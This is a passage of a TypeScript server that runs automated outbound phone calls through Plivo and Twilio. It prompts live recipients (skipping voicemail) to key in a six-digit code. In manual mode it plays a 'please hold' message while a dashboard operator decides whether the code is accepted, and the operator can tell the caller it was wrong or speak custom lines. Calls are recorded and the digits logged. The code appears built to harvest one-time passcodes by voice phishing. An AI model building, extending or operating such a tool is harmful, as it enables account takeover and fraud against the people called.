    const mp3OutPath = path.join(RECORDINGS_DIR, `${safeId}.mp3`);
    const hintDuration = typeof duration === 'number' && duration > 0 ? Math.round(duration) : undefined;
    if (hintDuration) {
      session.recordingDuration = hintDuration;
    }

    const transcoded = await transcodeToCompactHdMp3(buffer, rawExt, mp3OutPath);
    if (transcoded.ok) {
      markRecordingCompleted(session, mp3OutPath, 'mp3', hintDuration || transcoded.durationSec);
    } else {
      const outPath = path.join(RECORDINGS_DIR, `${safeId}.${rawExt}`);
      fs.writeFileSync(outPath, buffer);
      markRecordingCompleted(session, outPath, rawExt, hintDuration);
    }

    return res.json({
      success: true,
      session,
      recordingUrl: session.recordingUrl,
      recordingSizeBytes: session.recordingSizeBytes,
    });
  } catch (err: any) {
    console.error('Simulator recording upload error:', err);
    return res.status(500).json({ error: err.message || 'Failed to save recording' });
  }
});

// -------------------------------------------------------------
// PLIVO XML WEBHOOKS (Plivo Voice API)
// -------------------------------------------------------------
// 1. Plivo Outbound / Answer (Recording & Voice/DTMF Listening Start Immediately; Prompts Speak ONLY to Live Human!)
app.all(['/api/plivo/outbound', '/api/plivo/answer'], (req: Request, res: Response) => {
  const session = findSession(req);
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  if (!session) {
    res.type('text/xml');
    return res.send(`<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>Welcome to VoiceDrop Interactive. Session could not be found.</Speak>
  <Hangup />
</Response>`);
  }

  if (!session.answeredAt) {
    session.answeredAt = new Date().toISOString();
  }
  session.status = 'in-progress';

  const plivoMachine = req.body?.Machine ?? req.query?.Machine;
  const parsedAmd = parseAnsweredBy(undefined, plivoMachine);
  if (parsedAmd) {
    void applyAmdResult(session, parsedAmd, plivoMachine === 'true' ? 'plivo_machine' : 'plivo_human');
    if (parsedAmd === 'voicemail' && session.autoHangupOnVoicemail) {
      void finalizeCallRecording(session);
      res.type('text/xml');
      return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Hangup /></Response>`);
    }
  }

  addSessionEvent(session, {
    type: 'call-state',
    title: 'Call Connected (Plivo) — Listening & Recording Active',
    description:
      session.answeredBy === 'human'
        ? `Live human confirmed on ${session.to}. Playing immediate pickup greeting.`
        : `Listening for voice & keypad from start of call while verifying Live Human vs. Voicemail.`,
  });

  const gatherUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
  const gateUrl = `${appBaseUrl}/api/plivo/amd-gate?callId=${encodeURIComponent(session.id)}`;
  const recCallbackUrl = `${appBaseUrl}/api/plivo/recording?callId=${encodeURIComponent(session.id)}`;
  const recordTag =
    session.recordCall !== false
      ? `  <Record recordSession="true" fileFormat="wav" redirect="false" callbackUrl="${escapeXml(recCallbackUrl)}" callbackMethod="POST" />\n`
      : '';

  if (session.answeredBy === 'human') {
    session.promptsStarted = true;
    session.status = 'collecting-input';
    addSessionEvent(session, {
      type: 'playback',
      title: 'Immediate Pickup Greeting Played',
      description: `Playing synthetic voice to Live Human: "${session.introGreeting}"`,
      data: { greeting: session.introGreeting },
    });
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
${recordTag}  <Speak>${escapeXml(session.introGreeting)}</Speak>
  <GetInput action="${escapeXml(gatherUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="25" digitEndTimeout="8" speechEndTimeout="auto">
    <Speak>${escapeXml(session.script)}</Speak>
  </GetInput>
  <Speak>We did not receive your code. Thank you for your time. Goodbye.</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  session.status = 'collecting-input';
  persistSessionsToDisk();
  const waitLen = session.answeredBy === 'voicemail' ? 5 : 2;
  const silentXml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
${recordTag}  <GetInput action="${escapeXml(gateUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="${waitLen}" speechEndTimeout="auto">
    <Wait length="${waitLen}" />
  </GetInput>
  <Redirect method="POST">${escapeXml(gateUrl)}</Redirect>
</Response>`;

  res.type('text/xml');
  res.send(silentXml);
});

// 1a. Plivo Silent AMD & Post-Voicemail Human-Pickup Gate
app.all(['/api/plivo/amd-gate', '/api/plivo/human-start'], async (req: Request, res: Response) => {
  const session = findSession(req);
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  if (!session) {
    res.type('text/xml');
    return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Hangup /></Response>`);
  }

  const gatherUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
  const gateUrl = `${appBaseUrl}/api/plivo/amd-gate?callId=${encodeURIComponent(session.id)}`;
  const digitsParam = req.body.Digits || req.query.Digits;
  const rawDigits = digitsParam ? String(digitsParam).replace(/\D/g, '') : '';
  const speechParam = req.body.Speech || req.query.Speech;

  if (typeof speechParam === 'string' && speechParam.trim()) {
    appendSpeechTranscript(
      session,
      speechParam,
      undefined,
      session.answeredBy === 'voicemail' ? 'Voicemail Screening' : 'Pickup'
    );
  }

  const isDirectHumanStart = req.path.endsWith('/human-start');
  if (isDirectHumanStart && session.answeredBy !== 'human') {
    await applyAmdResult(session, 'human', 'plivo_live_human_confirmed');
  }

  if (!isDirectHumanStart && (session.answeredBy === 'voicemail' || session.answeredBy === 'fax')) {
    if (session.autoHangupOnVoicemail) {
      void finalizeCallRecording(session);
      res.type('text/xml');
      return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Hangup /></Response>`);
    }

    if (
      session.answeredBy === 'voicemail' &&
      checkHumanPickupOnVoicemail(session, speechParam, rawDigits)
    ) {
      session.humanPickedUpAfterVoicemail = true;
      await applyAmdResult(session, 'human', 'plivo_human_after_voicemail');
    } else {
      session.silentPollCount = (session.silentPollCount || 0) + 1;
      persistSessionsToDisk();
      if (session.silentPollCount > 12) {
        void finalizeCallRecording(session);
        res.type('text/xml');
        return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Hangup /></Response>`);
      }
      res.type('text/xml');
      return res.send(`<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <GetInput action="${escapeXml(gateUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="5" speechEndTimeout="auto">
    <Wait length="5" />
  </GetInput>
  <Redirect method="POST">${escapeXml(gateUrl)}</Redirect>
</Response>`);
    }
  }

  const elapsedSinceAnswer = session.answeredAt
    ? Date.now() - new Date(session.answeredAt).getTime()
    : 4000;
  const spokeLiveHuman =
    typeof speechParam === 'string' &&
    speechParam.trim().length > 0 &&
    !isVoicemailGreetingSpeech(speechParam);

  if (
    session.answeredBy === 'human' ||
    rawDigits.length > 0 ||
    spokeLiveHuman ||
    session.answeredBy === 'unknown' ||
    elapsedSinceAnswer >= 3200
  ) {
    if (session.answeredBy !== 'human') {
      await applyAmdResult(session, 'human', 'plivo_direct_human_pickup');
    }
    session.promptsStarted = true;
    session.status = 'collecting-input';
    addSessionEvent(session, {
      type: 'playback',
      title: 'Immediate Pickup Greeting Played',
      description: `Playing synthetic voice to Live Human: "${session.introGreeting}"`,
      data: { greeting: session.introGreeting },
    });
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(session.introGreeting)}</Speak>
  <GetInput action="${escapeXml(gatherUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="25" digitEndTimeout="8" speechEndTimeout="auto">
    <Speak>${escapeXml(session.script)}</Speak>
  </GetInput>
  <Speak>We did not receive your code. Thank you for your time. Goodbye.</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  res.type('text/xml');
  res.send(`<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <GetInput action="${escapeXml(gateUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="2" speechEndTimeout="auto">
    <Wait length="2" />
  </GetInput>
  <Redirect method="POST">${escapeXml(gateUrl)}</Redirect>
</Response>`);
});

// 2. Plivo Gather Callback (Strict post-code hold message rule + live speech capture)
app.all('/api/plivo/gather', (req: Request, res: Response) => {
  const session = findSession(req);
  const digitsParam = req.body.Digits || req.query.Digits;
  const speechParam = req.body.Speech || req.query.Speech;
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  if (!session) {
    res.type('text/xml');
    return res.send(`<?xml version="1.0" encoding="UTF-8"?><Response><Speak>Thank you. Goodbye.</Speak><Hangup /></Response>`);
  }

  if (typeof speechParam === 'string' && speechParam.trim()) {
    appendSpeechTranscript(session, speechParam);
  }

  const expectedLen = session.numDigits || 6;
  const rawDigits = digitsParam ? String(digitsParam).replace(/\D/g, '') : '';
  const gatherRetryUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;

  // Speech-only (no keypad digits yet) -> DO NOT play holdMessage
  if (!rawDigits) {
    session.status = 'collecting-input';
    persistSessionsToDisk();
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <GetInput action="${escapeXml(gatherRetryUrl)}" method="POST" inputType="dtmf speech" numDigits="${expectedLen}" finishOnKey="#" executionTimeout="25" digitEndTimeout="8" speechEndTimeout="auto">
    <Wait length="1" />
  </GetInput>
  <Speak>We did not receive your code. Goodbye.</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  // Partial keypad digits -> DO NOT play holdMessage yet
  if (rawDigits.length < expectedLen) {
    session.status = 'collecting-input';
    addSessionEvent(session, {
      type: 'dtmf',
      title: `Partial Digits Entered: [${rawDigits}] (${rawDigits.length}/${expectedLen})`,
      description: `Caller entered ${rawDigits.length} of ${expectedLen} digits. Requesting full code before hold.`,
    });
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <GetInput action="${escapeXml(gatherRetryUrl)}" method="POST" inputType="dtmf speech" numDigits="${expectedLen}" finishOnKey="#" executionTimeout="25">
    <Speak>We received ${rawDigits.length} digits. Please enter your full ${expectedLen}-digit code now, followed by the pound sign.</Speak>
  </GetInput>
  <Speak>We did not receive your code. Goodbye.</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  const enteredCode = rawDigits.slice(0, expectedLen);

  // 1. MANUAL OPERATOR REVIEW MODE -> Play holdMessage ONLY now after full code input
  if (session.verificationMode === 'manual') {
    session.pendingDigits = enteredCode;
    session.codeStatus = 'awaiting_operator';
    session.status = 'awaiting-operator';
    session.operatorDecision = 'pending';

    addSessionEvent(session, {
      type: 'dtmf',
      title: `Code Received: [${enteredCode}] — Awaiting Operator Decision`,
      description: `Caller entered ${enteredCode.length}-digit code. Playing post-code hold message while dashboard operator reviews.`,
      data: { digits: enteredCode, verificationMode: 'manual' },
    });

    const holdPrompt = session.holdMessage || 'Kindly hold while your information is being processed.';
    const waitUrl = `${appBaseUrl}/api/plivo/wait-operator?callId=${encodeURIComponent(session.id)}`;
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(holdPrompt)}</Speak>
  <Wait length="2" />
  <Redirect method="POST">${escapeXml(waitUrl)}</Redirect>
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  // 2. AUTO MATCH MODE
  const isValid = !session.expectedCode || enteredCode === session.expectedCode.trim();
  if (!isValid) {
    session.attempts = (session.attempts || 0) + 1;
    session.lastInvalidDigits = enteredCode;
    session.codeStatus = 'invalid';
    const maxAttempts = session.maxAttempts || 3;

    if (session.attempts < maxAttempts) {
      addSessionEvent(session, {
        type: 'error',
        title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${enteredCode}]`,
        description: `Entered code "${enteredCode}" does not match expected "${session.expectedCode}". Prompting retry.`,
        data: { entered: enteredCode, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
      });

      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(session.invalidMessage || 'That code is incorrect. Please try again.')}</Speak>
  <GetInput action="${escapeXml(gatherRetryUrl)}" method="POST" inputType="dtmf speech" numDigits="${expectedLen}" finishOnKey="#" executionTimeout="20">
    <Speak>Please enter your ${expectedLen}-digit code now, followed by the pound sign.</Speak>
  </GetInput>
  <Speak>We did not receive your code. Goodbye.</Speak>
  <Hangup />
</Response>`;
      session.status = 'collecting-input';
      res.type('text/xml');
      return res.send(xml);
    } else {
      session.status = 'failed';
      session.codeStatus = 'max_exceeded';
      session.completedAt = new Date().toISOString();

      addSessionEvent(session, {
        type: 'error',
        title: 'Verification Failed: Maximum Attempts Exceeded',
        description: `Recipient entered incorrect code ${session.attempts} times. Terminating call.`,
      });

      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>Maximum incorrect attempts exceeded. Goodbye.</Speak>
  <Hangup />
</Response>`;
      void finalizeCallRecording(session);
      res.type('text/xml');
      return res.send(xml);
    }
  }

  // AUTO VALID
  session.capturedDigits = enteredCode;
  session.codeStatus = 'valid';
  session.status = 'completed';
  session.completedAt = new Date().toISOString();

  addSessionEvent(session, {
    type: 'dtmf',
    title: `Code Verified Valid: [${enteredCode}]`,
    description: `Recipient entered valid code [${enteredCode}]. Playing confirmation message.`,
  });

  const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(confMsg)}</Speak>
  <Hangup />
</Response>`;
  void finalizeCallRecording(session);
  res.type('text/xml');
  return res.send(xml);
});

// 3. Plivo Wait Operator Loop
app.all('/api/plivo/wait-operator', (req: Request, res: Response) => {
  const session = findSession(req);
  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);

  if (!session) {
    res.type('text/xml');
    return res.send(`<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>Session has ended. Goodbye.</Speak>
  <Hangup />
</Response>`);
  }

  if (typeof req.body?.Speech === 'string' && req.body.Speech.trim()) {
    appendSpeechTranscript(session, req.body.Speech, undefined, 'On Hold');
  }

  // 1. Spoken cue from operator
  if (session.activeCue) {
    const cueMsg = session.activeCue.text;
    session.activeCue = undefined;
    const waitUrl = `${appBaseUrl}/api/plivo/wait-operator?callId=${encodeURIComponent(session.id)}`;
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(cueMsg)}</Speak>
  <Wait length="2" />
  <Redirect method="POST">${escapeXml(waitUrl)}</Redirect>
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  // 2. Approved by operator
  if (session.operatorDecision === 'approved') {
    session.capturedDigits = session.pendingDigits || session.capturedDigits;
    session.pendingDigits = undefined;
    session.codeStatus = 'valid';
    session.status = 'completed';
    session.completedAt = new Date().toISOString();

    const confMsg = session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.';
    addSessionEvent(session, {
      type: 'playback',
      title: 'Confirmation Message Played & Call Completed',
      description: `Playing synthetic voice: "${confMsg}"`,
    });

    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(confMsg)}</Speak>
  <Hangup />
</Response>`;
    void finalizeCallRecording(session);
    res.type('text/xml');
    return res.send(xml);
  }

  // 3. Rejected by operator
  if (session.operatorDecision === 'rejected') {
    session.operatorDecision = undefined;
    session.status = 'collecting-input';

    const gatherUrl = `${appBaseUrl}/api/plivo/gather?callId=${encodeURIComponent(session.id)}`;
    const retryMsg = session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.';
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Speak>${escapeXml(retryMsg)}</Speak>
  <GetInput action="${escapeXml(gatherUrl)}" method="POST" inputType="dtmf speech" numDigits="${session.numDigits || 6}" finishOnKey="#" executionTimeout="20">
    <Speak>Please enter your ${session.numDigits}-digit code now, followed by the pound sign.</Speak>
  </GetInput>
  <Speak>We did not receive your code. Goodbye.</Speak>
  <Hangup />
</Response>`;
    res.type('text/xml');
    return res.send(xml);
  }

  // 4. Fast 2-second Plivo hold poll loop
  session.waitPollCount = (session.waitPollCount || 0) + 1;
  persistSessionsToDisk();
  const waitUrl = `${appBaseUrl}/api/plivo/wait-operator?callId=${encodeURIComponent(session.id)}`;
  const comfortLine =
    session.waitPollCount % 6 === 0
      ? '  <Speak>Thank you for your patience. Please continue to hold.</Speak>\n'
      : '';
  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
${comfortLine}  <GetInput action="${escapeXml(waitUrl)}" method="POST" inputType="speech" executionTimeout="2" speechEndTimeout="auto">
    <Wait length="2" />
  </GetInput>
  <Redirect method="POST">${escapeXml(waitUrl)}</Redirect>
</Response>`;
  res.type('text/xml');
  res.send(xml);
});

// 4. Plivo Status Callback
app.all('/api/plivo/status', (req: Request, res: Response) => {
  const session = findSession(req);
  if (session) {
    const callStatus = req.body.CallStatus || req.body.Status;
    const duration = req.body.Duration ? parseInt(req.body.Duration, 10) : undefined;
    if (duration !== undefined) session.duration = duration;

    if (callStatus === 'completed' || callStatus === 'hangup') {
      session.status = 'completed';
      session.completedAt = new Date().toISOString();
      addSessionEvent(session, {
        type: 'call-state',
        title: 'Call Completed (Plivo)',
        description: `Session finished. Duration: ${duration || 0} seconds.`,
      });
      void finalizeCallRecording(session);
    } else if (['busy', 'failed', 'no-answer', 'cancel'].includes(String(callStatus).toLowerCase())) {
      session.status = 'failed';
      session.completedAt = new Date().toISOString();
      void finalizeCallRecording(session);
    }
  }
  res.sendStatus(200);
});


// Operator Action Endpoint - Direct manual control of call flow and audio prompts
app.post('/api/call/operator-action', async (req: Request, res: Response) => {
  const { callId, action, customMessage, customTwilio, carriersConfig = {} } = req.body;
  const session = getSessionById(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  const isCueAction = ['hold', 'incorrect_prompt', 'custom_cue'].includes(action);

  switch (action) {
    case 'approve':
      session.operatorDecision = 'approved';
      session.capturedDigits = session.pendingDigits || session.capturedDigits;
      session.pendingDigits = undefined;
      session.activeCue = undefined;
      session.codeStatus = 'valid';
      if (session.isSimulated) {
        session.status = 'completed';
        session.completedAt = new Date().toISOString();
        void finalizeCallRecording(session);
      }

      addSessionEvent(session, {
        type: 'dtmf',
        title: `Operator Approved Code: [${session.capturedDigits}]`,
        description: `Operator manually approved the code. Playing confirmation message to recipient.`,
        data: { digits: session.capturedDigits, decision: 'approved' },
      });
      break;

    case 'reject':
      session.operatorDecision = 'rejected';
      session.attempts = (session.attempts || 0) + 1;
      session.lastInvalidDigits = session.pendingDigits;
      session.pendingDigits = undefined;
      session.codeStatus = 'invalid';
      session.status = 'collecting-input';

      addSessionEvent(session, {
        type: 'error',
        title: `Operator Rejected Code (Attempt ${session.attempts}): [${session.lastInvalidDigits}]`,
        description: `Operator marked code as incorrect. Playing retry voice prompt to caller.`,
        data: { rejectedDigits: session.lastInvalidDigits, attempts: session.attempts },
      });
      break;

    case 'hold': {
      const hasInputtedCode = Boolean(
        session.pendingDigits ||
          session.capturedDigits ||
          session.lastInvalidDigits ||
          session.status === 'awaiting-operator'
      );
      if (!hasInputtedCode) {
        return res.status(400).json({
          error: 'Hold message can only be played after the recipient has inputted their keypad code.',
        });
      }
      const holdText = customMessage || session.holdMessage || 'Kindly hold while your information is being processed.';
      session.activeCue = { text: holdText, timestamp: new Date().toISOString() };
      addSessionEvent(session, {
        type: 'playback',
        title: 'Operator Triggered: "Kindly Hold / Please Wait"',
        description: `Prompting recipient: "${holdText}"`,
        data: { cue: holdText },
      });
      break;
    }

    case 'incorrect_prompt': {
      const incorrectText = customMessage || session.invalidMessage || 'The code entered is incorrect. Please try again.';
      session.activeCue = { text: incorrectText, timestamp: new Date().toISOString() };
      addSessionEvent(session, {
        type: 'playback',
        title: 'Operator Triggered: "Code Incorrect"',
        description: `Prompting recipient: "${incorrectText}"`,
        data: { cue: incorrectText },
      });
      break;
    }

    case 'start_human_greeting': {
      if (session.answeredBy === 'voicemail') {
        session.humanPickedUpAfterVoicemail = true;
      }
      await applyAmdResult(session, 'human', 'operator_confirmed_human');

      if (session.isSimulated) {
        session.promptsStarted = true;
        session.status = 'collecting-input';
        addSessionEvent(session, {
          type: 'playback',
          title: 'Immediate Pickup Greeting Played',
          description: `Operator confirmed live human. Playing synthetic voice: "${session.introGreeting}"`,
          data: { greeting: session.introGreeting, voice: session.voice },
        });
      } else {
        await redirectLiveCallToHumanStart(session, customTwilio, carriersConfig);
      }
      break;
    }

    case 'custom_cue':
      if (session.answeredBy === 'voicemail' && !session.humanPickedUpAfterVoicemail) {
        return res.status(400).json({
          error: 'Voicemail machine is on the line. Click "Human Picked Up — Play Greeting" first if a live person answered.',
        });
      }
      if (customMessage) {
        session.activeCue = { text: customMessage.trim(), timestamp: new Date().toISOString() };
        addSessionEvent(session, {
          type: 'playback',
          title: `Operator Spoke to Recipient: "${customMessage.trim()}"`,
          description: `Synthetic voice playing custom message to caller.`,
          data: { cue: customMessage.trim() },
        });
      }
      break;

    default:
      return res.status(400).json({ error: `Unknown operator action: ${action}` });
  }

  // If this is a live Twilio call and the caller is currently in <Gather> (not yet in wait-operator loop),
  // redirect the live call leg to /api/twiml/cue-gather so they hear the operator cue immediately and resume <Gather>!
  if (
    !session.isSimulated &&
    isCueAction &&
    session.activeCue &&
    ['in-progress', 'collecting-input'].includes(session.status)
  ) {
    const providerSid = session.providerCallSid || session.id;
    const carrier = session.carrier || 'twilio';
    const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);

    if (carrier === 'twilio' && providerSid.startsWith('CA')) {
      try {
        const creds = getCallCredentials(session.id);
        const accountSid =
          carriersConfig.twilio?.accountSid ||
          customTwilio?.accountSid ||
          creds?.twilioSid ||
          process.env.TWILIO_ACCOUNT_SID;
        const authToken =
          carriersConfig.twilio?.authToken ||
          customTwilio?.authToken ||
          creds?.twilioToken ||
          process.env.TWILIO_AUTH_TOKEN;
        if (accountSid && authToken) {
          const client = twilio(accountSid, authToken);
          await client.calls(providerSid).update({
            url: `${appBaseUrl}/api/twiml/cue-gather?callId=${encodeURIComponent(session.id)}`,
            method: 'POST',
          });
        }
      } catch (err) {
        console.error('Error redirecting live Twilio call for cue:', err);
      }
    }
  }

  res.json({ success: true, session });
});

// Simulator Action Webhook - Used by the interactive phone mockup in the browser
app.post('/api/call/simulate-event', async (req: Request, res: Response) => {
  const { callId, action, digits, speech, confidence } = req.body;
  const session = getSessionById(callId);

  if (!session) {
    return res.status(404).json({ error: 'Call session not found' });
  }

  switch (action) {
    case 'answer':
      session.status = 'in-progress';
      session.answeredAt = new Date().toISOString();
      session.promptsStarted = true;
      if (session.recordCall !== false) {
        session.recordingStatus = 'recording';
      }
      await applyAmdResult(session, 'human', 'simulator_human_answer');

      addSessionEvent(session, {
        type: 'call-state',
        title: 'Direct Live Human Answered Call',
        description: `Call connected with live human on ${session.to}. Listening, recording & playing immediate pickup greeting.`,
      });

      addSessionEvent(session, {
        type: 'playback',
        title: 'Immediate Pickup Greeting Played',
        description: `Playing synthetic voice: "${session.introGreeting}"`,
        data: { greeting: session.introGreeting, voice: session.voice },
      });

      session.status = 'collecting-input';
      addSessionEvent(session, {
        type: 'gather',
        title: `Listening for ${session.numDigits}-Digit Code & Live Voice`,
        description: `Prompting: "${session.script}" (${session.verificationMode === 'manual' ? 'Manual Operator Decision' : 'Auto Match'})`,
      });
      break;

    case 'voicemail': {
      session.status = 'in-progress';
      session.answeredAt = new Date().toISOString();
      session.voicemailDetectedAt = session.answeredAt;
      // CRITICAL: Never play greeting or prompts to a Voicemail Machine!
      session.promptsStarted = false;
      if (session.recordCall !== false) {
        session.recordingStatus = 'recording';
      }
      await applyAmdResult(session, 'voicemail', 'simulator_machine_start');
      appendSpeechTranscript(
        session,
        `Your call has been forwarded to an automated voice messaging system for ${session.to}. At the tone, please record your message.`,
        0.98,
        'Voicemail Greeting'
      );
      session.voicemailGreetingComplete = true;
      if (!session.autoHangupOnVoicemail) {
        session.status = 'collecting-input';
        addSessionEvent(session, {
          type: 'gather',
          title: 'Silent Listening Active on Voicemail (Prompts Muted)',
          description: 'Listening for voice/DTMF & recording from call start. Will play pickup greeting immediately if a human takes the phone.',
        });
      }
      break;
    }

    case 'human_pickup': {
      session.humanPickedUpAfterVoicemail = true;
      session.promptsStarted = true;
      session.status = 'collecting-input';
      await applyAmdResult(session, 'human', 'simulator_human_picked_up_after_voicemail');

      addSessionEvent(session, {
        type: 'playback',
        title: 'Immediate Pickup Greeting Played',
        description: `Human took the phone after voicemail! Playing immediate pickup greeting: "${session.introGreeting}"`,
        data: { greeting: session.introGreeting, voice: session.voice },
      });

      addSessionEvent(session, {
        type: 'gather',
        title: `Listening for ${session.numDigits}-Digit Code & Live Voice`,
        description: `Prompting live human: "${session.script}"`,
      });
      break;
    }

    case 'speech':
      if (typeof speech === 'string' && speech.trim()) {
        appendSpeechTranscript(
          session,
          speech.trim(),
          typeof confidence === 'number' ? confidence : 0.95
        );

        // If voicemail answered earlier and a human now speaks on the line (e.g. "Hello?"), start greeting immediately!
        if (
          session.answeredBy === 'voicemail' &&
          !session.promptsStarted &&
          checkHumanPickupOnVoicemail(session, speech.trim())
        ) {
          session.humanPickedUpAfterVoicemail = true;
          session.promptsStarted = true;
          session.status = 'collecting-input';
          await applyAmdResult(session, 'human', 'human_voice_after_voicemail');

          addSessionEvent(session, {
            type: 'playback',
            title: 'Immediate Pickup Greeting Played',
            description: `Live human voice detected after voicemail! Playing greeting: "${session.introGreeting}"`,
            data: { greeting: session.introGreeting, voice: session.voice },
          });

          return res.json({
            success: true,
            session,
            humanPickedUp: true,
          });
        }
      }
      break;

    case 'dtmf':
      if (digits) {
        const expectedLen = session.numDigits || 6;
        const rawDigits = String(digits).replace(/\D/g, '');

        // If voicemail was active and a human pressed a digit on the handset, wake up human greeting!
        if (session.answeredBy === 'voicemail' && !session.promptsStarted) {
          session.humanPickedUpAfterVoicemail = true;
          session.promptsStarted = true;
          session.status = 'collecting-input';
          await applyAmdResult(session, 'human', 'human_keypad_after_voicemail');

          if (rawDigits.length < expectedLen) {
            addSessionEvent(session, {
              type: 'playback',
              title: 'Immediate Pickup Greeting Played',
              description: `Keypad wakeup after voicemail! Playing greeting: "${session.introGreeting}"`,
            });
            return res.json({
              success: true,
              session,
              humanPickedUp: true,
              codeStatus: 'wakeup',
            });
          }
        }

        if (rawDigits.length < expectedLen) {
          addSessionEvent(session, {
            type: 'dtmf',
            title: `Partial Digits Entered: [${rawDigits}] (${rawDigits.length}/${expectedLen})`,
            description: `Waiting for full ${expectedLen}-digit code before playing hold prompt.`,
          });
          return res.json({
            success: true,
            session,
            codeStatus: 'partial',
            message: `Please enter all ${expectedLen} digits.`,
          });
        }

        const enteredCode = rawDigits.slice(0, expectedLen);

        // 1. MANUAL OPERATOR CONTROL MODE -> Now play post-code holdMessage
        if (session.verificationMode === 'manual') {
          session.pendingDigits = enteredCode;
          session.codeStatus = 'awaiting_operator';
          session.status = 'awaiting-operator';
          session.operatorDecision = 'pending';

          addSessionEvent(session, {
            type: 'dtmf',
            title: `Code Received: [${enteredCode}] — Awaiting Operator Decision`,
            description: `Caller entered ${enteredCode.length}-digit code. Playing hold message while operator reviews in web console.`,
            data: { digits: enteredCode, verificationMode: 'manual' },
          });

          return res.json({
            success: true,
            session,
            codeStatus: 'awaiting_operator',
            pendingDigits: enteredCode,
            message: session.holdMessage || 'Kindly hold while your information is being processed.',
          });
        }

        // 2. AUTO MATCH MODE
        const isValid = !session.expectedCode || enteredCode === session.expectedCode.trim();

        if (!isValid) {
          session.attempts = (session.attempts || 0) + 1;
          session.lastInvalidDigits = enteredCode;
          session.codeStatus = 'invalid';

          const maxAttempts = session.maxAttempts || 3;

          if (session.attempts < maxAttempts) {
            addSessionEvent(session, {
              type: 'error',
              title: `Invalid Code Entered (Attempt ${session.attempts}/${maxAttempts}): [${enteredCode}]`,
              description: `Entered code "${enteredCode}" does not match expected "${session.expectedCode}". Prompting recipient to try again.`,
              data: { entered: enteredCode, expected: session.expectedCode, attempt: session.attempts, maxAttempts },
            });

            return res.json({
              success: true,
              session,
              codeStatus: 'invalid',
              attempts: session.attempts,
              maxAttempts,
              message: session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.',
            });
          } else {
            session.status = 'failed';
            session.codeStatus = 'max_exceeded';
            session.completedAt = new Date().toISOString();

            addSessionEvent(session, {
              type: 'error',
              title: 'Verification Failed: Maximum Attempts Exceeded',
              description: `Maximum incorrect code attempts (${session.attempts}) reached. Ending call.`,
            });
            void finalizeCallRecording(session);

            return res.json({
              success: true,
              session,
              codeStatus: 'max_exceeded',
              message: 'Maximum attempts reached. Goodbye.',
            });
          }
        }

        // VALID CODE IN AUTO MODE
        session.capturedDigits = enteredCode;
        session.codeStatus = 'valid';

        addSessionEvent(session, {
          type: 'dtmf',
          title: `Code Verified Valid: [${enteredCode}]`,
          description: `Keypad capture: Correct ${enteredCode.length}-digit code [${enteredCode}] verified! Playing confirmation.`,
          data: { digits: enteredCode, expected: session.expectedCode },
        });

        setTimeout(() => {
          session.status = 'completed';
          session.completedAt = new Date().toISOString();
          addSessionEvent(session, {
            type: 'call-state',
            title: 'Call Interaction Finalized',
            description: `Confirmation message played: "${session.successMessage || 'Your code has been verified.'}". Call completed.`,
          });
          void finalizeCallRecording(session);
        }, 1200);

        return res.json({
          success: true,
          session,
          codeStatus: 'valid',
          message: session.successMessage || 'Thank you. Your code has been verified successfully. Goodbye.',
        });
      }
      break;

    case 'decline':
    case 'hangup':
